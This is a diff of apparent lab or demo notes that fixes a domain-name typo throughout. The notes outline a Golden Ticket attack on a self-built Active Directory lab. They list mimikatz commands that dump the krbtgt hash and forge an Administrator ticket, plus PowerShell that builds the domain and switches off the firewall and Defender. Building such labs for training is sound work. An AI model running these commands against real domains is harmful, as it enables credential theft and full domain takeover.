@@ -1,5 +1,5 @@
 Domain:
-goldencheesburger.com
+goldencheezburger.com
 
 Network:
 10.x.x.x/24
@@ -38,7 +38,7 @@ Skeleton Key
 Scenario:
 1) Gain access as user
 2) Local PrivEsc via schedueld task running as golden-cl-01\Administrator
-3) Domain PrivEsc via loggd on user goldencheesburger\
+3) Domain PrivEsc via loggd on user goldencheezburger\
 4) Dump krbtgt NTLM hash
 5) Issue ticket for Administrator
 6) Brows fileshare on golden-dc-01
@@ -52,8 +52,8 @@ Preppe demo
 
 Commands:
 privilege::debug
-lsadump::dcsync /domain:goldencheesburger.com /all /user:krbtgt (or lsadump::lsa /inject /name:krbtgt via PsExec)
-Kerberos::golden /user:Administrator /domain:goldencheesburger.com /sid:xxxx /krbtgt:xxxx /id:500
+lsadump::dcsync /domain:goldencheezburger.com /all /user:krbtgt (or lsadump::lsa /inject /name:krbtgt via PsExec)
+Kerberos::golden /user:Administrator /domain:goldencheezburger.com /sid:xxxx /krbtgt:xxxx /id:500
 misc::cmd
 klist
 whoami
@@ -62,11 +62,11 @@ dir \\golden-dc-01\c$
 Deploy domain:
 
 Install-ADDSForest `
--DomainName "goldencheesburger.com" `
+-DomainName "goldencheezburger.com" `
 -CreateDnsDelegation:$false ` 
 -DatabasePath "C:\Windows\NTDS" ` 
 -DomainMode "7" ` 
--DomainNetbiosName "goldencheesburger" ` 
+-DomainNetbiosName "goldencheezburger" ` 
 -ForestMode "7" ` 
 -InstallDns:$true ` 
 -LogPath "C:\Windows\NTDS" ` 
@@ -86,7 +86,7 @@ New-ADUser -Name "user" `
 -AccountPassword "***********" `
 -PasswordNeverExpires $true
 
-Add-ADGroupMember -Identity "goldencheesburger\Domain Admins" -Members admin
+Add-ADGroupMember -Identity "goldencheezburger\Domain Admins" -Members admin
 
 New-ADComputer -Name "golden-cl-01" -SamAccountName "golden-cl-01"
 
@@ -94,7 +94,7 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 
 Deploy client:
-Add-computer –domainname "goldencheesburger.com" -restart
+Add-computer –domainname "goldencheezburger.com" -restart
 
 ## Resrart ##
 
